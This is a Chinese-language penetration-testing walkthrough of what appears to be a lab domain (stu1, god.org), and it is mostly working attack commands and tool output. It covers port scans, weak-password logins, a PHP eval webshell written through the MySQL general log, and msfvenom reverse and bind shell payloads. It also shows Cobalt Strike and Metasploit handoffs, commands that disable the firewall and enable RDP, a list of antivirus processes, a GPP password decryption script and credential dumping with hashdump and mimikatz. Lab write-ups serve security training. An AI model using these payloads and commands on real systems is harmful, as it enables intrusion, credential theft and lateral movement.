<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">▶ sudo masscan -e eth0 -p0-65535 --max-rate 500 192.168.140.144</span><br><span class="line"></span><br><span class="line">Starting masscan 1.0.6 (http://bit.ly/14GZzcT) at 2020-12-14 06:31:45 GMT</span><br><span class="line"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [65536 ports/host]</span><br><span class="line">Discovered open port 135/tcp on 192.168.140.144</span><br><span class="line">Discovered open port 1029/tcp on 192.168.140.144</span><br><span class="line">Discovered open port 3306/tcp on 192.168.140.144</span><br><span class="line">Discovered open port 139/tcp on 192.168.140.144</span><br><span class="line">Discovered open port 1026/tcp on 192.168.140.144</span><br><span class="line">Discovered open port 1538/tcp on 192.168.140.144</span><br><span class="line">Discovered open port 1028/tcp on 192.168.140.144</span><br><span class="line">Discovered open port 1025/tcp on 192.168.140.144</span><br><span class="line">Discovered open port 1027/tcp on 192.168.140.144</span><br><span class="line">Discovered open port 445/tcp on 192.168.140.144</span><br><span class="line">Discovered open port 80/tcp on 192.168.140.144</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">▶ nmap -p80,135,139,445,1025,1026,1027,1028,1029,1538,3306 -sV -sC -oA nmap 192.168.140.144</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2020-12-14 14:39 CST</span><br><span class="line">Nmap scan report for stu1 (192.168.140.144)</span><br><span class="line">Host is up (0.00091s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)</span><br><span class="line">|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</span><br><span class="line">|_http-title: phpStudy \xE6\x8E\xA2\xE9\x92\x88 2014</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: GOD)</span><br><span class="line">1025/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1026/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1027/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1028/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1029/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1538/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">3306/tcp open  mysql        MySQL (unauthorized)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: STU1, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:13:7b:ad (VMware)</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional</span><br><span class="line">|   Computer name: stu1</span><br><span class="line">|   NetBIOS computer name: STU1\x00</span><br><span class="line">|   Domain name: god.org</span><br><span class="line">|   Forest name: god.org</span><br><span class="line">|   FQDN: stu1.god.org</span><br><span class="line">|_  System time: 2020-12-14T14:40:35+08:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2020-12-14 14:40:35</span><br><span class="line">|_  start_date: 2020-12-14 13:28:52</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 70.65 seconds</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>开了80和3306端口，3306没有开启远程连接，进去80看看，是一个php探针页面，可以看到是一个phpStudy的集成环境，显示出了绝对路径<code>	C:/phpStudy/WWW</code>，测试Mysql连接可以盲猜出一个弱密码<code>root:root</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715420522560ff952f1107c43.png" alt="image-20201214141700672"></p>
<p>用强大的dirmap扫一波后台目录，发现<code>phpMyAdmin</code>和一个yxcms的备份文件<code>beifen.rar</code>（有的字典会没有，比如dirsearch）</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20201217154300e8da1adcb1e32f9d87.png" alt="image-20201214154701862"></p>
<h3 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h3><p>到这里我们可以尝试检测以下服务的弱密码：</p>
<ol>
<li>yxcms后台弱密码</li>
<li>phpMyAdmin后台弱密码</li>
</ol>
<p><strong>yxcms弱密码</strong></p>
<p>查看网站或者数据库配置文件，可以直接在备份文件中找到yxcms的默认后台密码</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171543c550e5847e4336055053.png" alt="image-20201214155418319"></p>
<p>网上搜搜yxcms后台地址为<code>http://xxx.xxx.xxx.xxx/yxcms/index.php?r=admin/index/login</code>，直接登进去</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171543f6d76730cd186e7ef62e.png" alt="image-20201214155955610"></p>
<p><strong>phpMyAdmin弱密码</strong></p>
<p>先试一试通用密码<code>root:(NULL)</code>和<code>root:root</code>，不行就用脚本爆破，这里是<code>root:root</code>直接进去了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171543e3cd90fbb0182b33342d.png" alt="image-20201214162146967"></p>
<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><p>到这里我们可以考虑以下攻击方法：</p>
<ol>
<li>phpStudy后门</li>
<li>phpMyAdmin后台写shell</li>
<li>yxcms后台写shell</li>
</ol>
<p>尝试了一下phpStudy后门，利用失败</p>
<p><strong>1. phpMyAdmin利用Mysql日志写shell</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line">set global general_log = on;</span><br><span class="line">set global general_log_file = &#x27;C:/phpStudy/WWW/shell.php&#x27;;</span><br><span class="line">select &#x27;&lt;?php @eval($_REQUEST[&quot;kk&quot;]);?&gt;&#x27;&#x27;;</span><br><span class="line">set global general_log_file = &#x27;C:/phpStudy/MySQL/data/stu1.log&#x27;;</span><br><span class="line">set global general_log = off;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171543e3cd90fbb0182b33342d.png" alt="image-20201214165117322"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171543eb5a44893be1b43f77e8.png" alt="image-20201214165140607"></p>
<p><strong>2. yxcms后台直接修改php前台模板</strong></p>
<p>yxcms</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171543c6b75b00e17b6f223051.png" alt="image-20201214164700518"></p>
<p>到备份文件找找路径就好</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20201217154341abb077a0a60a1a0060.png" alt="image-20201214164844080"></p>
<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="连上Cobalt-Strike"><a href="#连上Cobalt-Strike" class="headerlink" title="连上Cobalt Strike"></a>连上Cobalt Strike</h3><p>用antsword连上一句话，上传beacon.exe反弹到CS</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715430f242f6c6f789b50481d.png" alt="image-20201214232111140"></p>
<p>因为没有杀软，为了方便测试，我把sleep值直接调成0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; sleep  0</span><br></pre></td></tr></table></figure>

<h4 id="正反向shell"><a href="#正反向shell" class="headerlink" title="正反向shell"></a>正反向shell</h4><blockquote>
<p>MSF遇到中文乱码：chcp 65001</p>
</blockquote>
<p><strong>反向shell</strong></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lport=&lt;your port&gt; lhost=&lt;your host&gt;  -f exe -o torjan.exe</span><br></pre></td></tr></table></figure>

<p>Metasploit里</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload  windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost &lt;your host&gt;</span><br><span class="line"><span class="built_in">set</span> lport &lt;your port&gt;</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><strong>正向shell</strong></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp lport=&lt;victim port&gt; -f exe -o torjan.exe</span><br></pre></td></tr></table></figure>

<p>Metasploit 里</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> lport &lt;victim port&gt;</span><br><span class="line"><span class="built_in">set</span> rhost &lt;victim host&gt;</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>

<h4 id="MSF转CS"><a href="#MSF转CS" class="headerlink" title="MSF转CS"></a>MSF转CS</h4><p>CS里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf添加地址为&lt;host&gt;:&lt;port&gt;的windows/beacon/reverse_http的监听器</span><br></pre></td></tr></table></figure>

<p>MSF里</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost &lt;host&gt;</span><br><span class="line">set lport &lt;port&gt;</span><br><span class="line">set session 1</span><br><span class="line">set disablepayloadhandler true # 禁用 payload handler的监听否则有冲突</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>

<h4 id="CS转MSF"><a href="#CS转MSF" class="headerlink" title="CS转MSF"></a>CS转MSF</h4><p>MSF里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost &lt;host&gt;</span><br><span class="line">set lport &lt;port&gt;</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>CS里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spawn一个地址为&lt;host&gt;:&lt;port&gt;的windows/foreign/reverse_http</span><br></pre></td></tr></table></figure>

<h3 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h3><p>查看当前用户和权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715388a0b318c0aa4e0d8cffc.png" alt="image-20201215142606557"></p>
<p>查看有哪些用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715381d341d0eefc9ca772659.png" alt="image-20201215142617687"></p>
<p>获取域SID、组信息、特权等信</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715430f5693d58f11ea66760e.png" alt="image-20201215142641103"></p>
<p>查看指定账户的详细信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user Administrtor /domain</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715442fe3b6ab842fd4a6f231.png" alt="image-20201215142813124"></p>
<p>查看本机管理员（通常会包含有域用户）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715443cedaab5e5e4eaf4f2cc.png" alt="image-20201215142847663"></p>
<p>查看当前在线的用户（防止踢别人下线）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715447e9847d50026a44135d0.png" alt="image-20201215143036818"></p>
<p>查询网络信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171544d3fa5fb4830db592c798.png" alt="image-20201215143122063"></p>
<p>查看系统详细信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171544fa75943ccd6d74dd7712.png" alt="image-20201215143137704"></p>
<p>查询系统体系架构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171544396e0421613ca864e5f2.png" alt="image-20201215143151701"></p>
<p>查询已安装的软件及版本信息</p>
<blockquote>
<p>在win10中，输入<code>wmic /?</code>会提示wmic已弃用，但在server2012R2、win7等版本中可以正常使用</p>
<p>powershell中可替代该命令的是<code>Get-WmiObject</code></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic product get name,version</span><br><span class="line">Get-WmiObject -class win32_product | Select-Object -property name,version</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171544b127523ec9f14ae3055f.png" alt="image-20201215143212494"></p>
<p>端口及网络连接情况查看</p>
<blockquote>
<p>如果这台主机是台代理服务器，则会有很多IP来连接他的代理端口；</p>
<p>如果是台用来更新的服务器，例如WSUS，则他可能会开放一个8530端口（WSUS是Windows Server Update Services的简称）；</p>
<p>如果是DNS服务器则可能开着53端口；</p>
<p>如果这台主机可以访问外网，同时发现这里存在大量powershell进程在向外进行连接，则多半可以判断该主机为沦陷的肉鸡。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715449da0fae3118570a2ee7d.png" alt="image-20201215143337375"></p>
<p>查看补丁情况</p>
<blockquote>
<p>如果systeminfo后，最下面的“登录服务器”字段值为”WORDGROUP”则说明此电脑不在域内</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715445e011aba7b435f570a7c.png" alt="image-20201215143505866"></p>
<p>查看本机共享</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net share</span><br><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171546b0b5dab6942a67340599.png" alt="image-20201215143531715"></p>
<p>查看指定主机的共享</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net view 127.0.0.1</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20201217154494f29d8ffb3b551a7370.png" alt="image-20201215143549978"></p>
<p>查看远程连接端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query &quot;hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp&quot;  /v  portnumber</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171546625626766ee8fbe6738b.png" alt="image-20201215143639065"></p>
<p>查看进程列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist  /v</span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171544053ba800b87a343868f0.png" alt="image-20201215143658031"></p>
<p><strong>常见的杀软进程</strong></p>
<table>
<thead>
<tr>
<th>进程名</th>
<th>软件</th>
</tr>
</thead>
<tbody><tr>
<td>360sd.exe</td>
<td>360 杀毒</td>
</tr>
<tr>
<td>360tray.exe</td>
<td>360 实时保护</td>
</tr>
<tr>
<td>ZhuDongFangYu.exe</td>
<td>360 主动防御</td>
</tr>
<tr>
<td>KSafeTray.exe</td>
<td>金山卫士</td>
</tr>
<tr>
<td>SafeDogUpdateCenter.exe</td>
<td>安全狗</td>
</tr>
<tr>
<td>McAfee</td>
<td>McShield.exe</td>
</tr>
<tr>
<td>egui.exe</td>
<td>NOD32</td>
</tr>
<tr>
<td>AVP.exe</td>
<td>卡巴斯基</td>
</tr>
<tr>
<td>avguard.exe</td>
<td>小红伞</td>
</tr>
<tr>
<td>bdagent.exe</td>
<td>BitDefender</td>
</tr>
</tbody></table>
<p>查询并开启远程连接端口</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Windows Server <span class="number">2008</span> &amp; <span class="number">2012</span>打开<span class="number">3389</span>：</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices <span class="built_in">path</span> win32_terminalservicesetting where (__CLASS !=&quot;&quot;) <span class="keyword">call</span> setallowtsconnections <span class="number">1</span></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices <span class="built_in">path</span> win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) <span class="keyword">call</span> setuserauthenticationrequired <span class="number">1</span></span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot;  /v  fSingleSessionPerUser   /t  REG_DWORD  /d  <span class="number">0</span>  /f</span><br><span class="line"></span><br><span class="line"># Windows Server <span class="number">2003</span>打开<span class="number">3389</span></span><br><span class="line">wmic <span class="built_in">path</span> win32_terminalservicesetting where (__CLASS !=&quot;&quot;)   <span class="keyword">call</span>  setallowtsconnections <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><p>查看时间服务器</p>
<blockquote>
<p>如果能够执行，说明此台机器在域中 (若是此命令在显示域处显示 WORKGROUP，则不存在域，若是报错：发生系统错误，则存在域，但该用户不是域用户)</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171544551328cc426628aa0ed0.png" alt="image-20201215143959438"></p>
<p>查询当前的登录域与用户信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171545e3e8772bb343ed8cd485.png" alt="image-20201215144022866"></p>
<p>查找域控</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup god.org</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171545560d88112a288beda7c5.png" alt="image-20201215144044940"></p>
<p>查询域控和用户信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user /domain</span><br><span class="line">wmic useraccount get /all</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20201217154516ce30f424f6bbc6d750.png" alt="image-20201215144102038"></p>
<p>查看所有域成员计算机列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20201217154530818f11f60a3af2b75b.png" alt="image-20201215144115674"></p>
<p>查看域管理员</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715453e75c05153286dca038e.png" alt="image-20201215144132622"></p>
<p>获取域密码信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171545bbacb8bc4db0c7ba4071.png" alt="image-20201215144145062"></p>
<p>获取域信任信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171545319f74eb8ced0ad67f97.png" alt="image-20201215144206756"></p>
<h3 id="防火墙设置"><a href="#防火墙设置" class="headerlink" title="防火墙设置"></a>防火墙设置</h3><p>查看防火墙配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure>

<p>设置防火墙日志存储位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\Windows\temp\FirewallLOG.log</span><br></pre></td></tr></table></figure>

<p>关闭防火墙</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># before windows 2003</span><br><span class="line">netsh firewall get opmode disable </span><br><span class="line"></span><br><span class="line"># after windows 2003</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<p>修改防火墙配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># before Windows 2003</span><br><span class="line"># 允许某个程序的全连接</span><br><span class="line">netsh firewall add allowdprogram C:\nc.exe &quot;allow nc&quot; enable</span><br><span class="line"></span><br><span class="line"># after windows 2003</span><br><span class="line"># 允许某个程序连入</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;</span><br><span class="line"># 允许某个程序外连</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;</span><br><span class="line"># 开放3389端口</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure>

<h3 id="横向探测"><a href="#横向探测" class="headerlink" title="横向探测"></a>横向探测</h3><h4 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h4><p>使用<code>net view</code>查看目标内网情况和端口开放情况</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171545481ffe4537dd8ea9a7b4.png" alt="image-20201215144454184"></p>
<p>上方点击<code>目标视图</code>的快捷键查看内网主机</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715450a7954fd957612f7a2db.png" alt="image-20201215144557042"></p>
<p>探测其他主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171540d9e2032e4cb5da82dc4f.png" alt="image-20201215153640858"></p>
<p>最简单的直接 <code>arp -a</code> 查看也可以，这里还推荐一个好用工具 <a href="https://github.com/k8gege/Ladon">Ladon</a>，下载完在脚本管理器添加<code>Lodan.cna</code>即可</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715409849cc073541a580feda.png" alt="image-20201215150349091"></p>
<p>然后就能直接使用了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171546478cc292e2bc3d405416.png" alt="image-20201215150438617"></p>
<p>扫描网段内存活主机信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.52.0/24 OsScan</span><br></pre></td></tr></table></figure>

<blockquote>
<p>另外推荐<a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a>这款域渗透分析工具</p>
<p>BloodHound 是一种单页的 JavaScript 的 Web 应用程序，构建在 Linkurious 上，用 Electron 编译，NEO4J 数据库 PowerShell&#x2F;C# ingestor.BloodHound 使用可视化图来显示 Active Directory 环境中隐藏的和相关联的主机内容。攻击者可以使用 BloodHound 轻松识别高度复杂的攻击路径，否则很难快速识别。防御者可以使用 BloodHound 来识别和防御那些相同的攻击路径。蓝队和红队都可以使用 BloodHound 轻松深入了解 Active Directory 环境中的权限关系。</p>
</blockquote>
<h4 id="抓密码"><a href="#抓密码" class="headerlink" title="抓密码"></a>抓密码</h4><p>gpp目录找账号</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 列目录</span><br><span class="line">shell <span class="built_in">dir</span> \\域名\sysvol\域名\</span><br><span class="line"># 查文件</span><br><span class="line">shell <span class="built_in">findstr</span> /s /i /m /c:&quot;password&quot; \\域名\SYSVOL\域名\Policies*.xml</span><br></pre></td></tr></table></figure>

<p>密码解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8</span></span><br><span class="line"><span class="string">f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">cpassword = <span class="string">&quot;加密的字符串&quot;</span></span><br><span class="line">cpassword += <span class="string">&quot;=&quot;</span> * ((<span class="number">4</span> - <span class="built_in">len</span>(cpassword) % <span class="number">4</span>) % <span class="number">4</span>)</span><br><span class="line">password = b64decode(cpassword)</span><br><span class="line">o = AES.new(key, AES.MODE_CBC, <span class="string">&quot;\x00&quot;</span> * <span class="number">16</span>).decrypt(password)</span><br><span class="line"><span class="built_in">print</span> o[:-<span class="built_in">ord</span>(o[-<span class="number">1</span>])].decode(<span class="string">&#x27;utf16&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>使用<code>hashdump</code>读取内存密码</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171539b7f45d211df843387dc9.png" alt="image-20201215144705030"></p>
<p>使用 <code>mimikatz</code>的<code>logonpasswords</code>读注册表密码</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715409ce079ad5451d68be207.png" alt="image-20201215144849007"></p>
<p>转到<code>凭证视图</code>可以看到抓取的密码信息</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715402218d46102eb7a56f8a4.png" alt="image-20201215145018039"></p>
<p>权限不够可打开<code>Elevate</code>进行提权</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715390117d1ec7942bdfa9fd5.png" alt="image-20201215145324355"></p>
<blockquote>
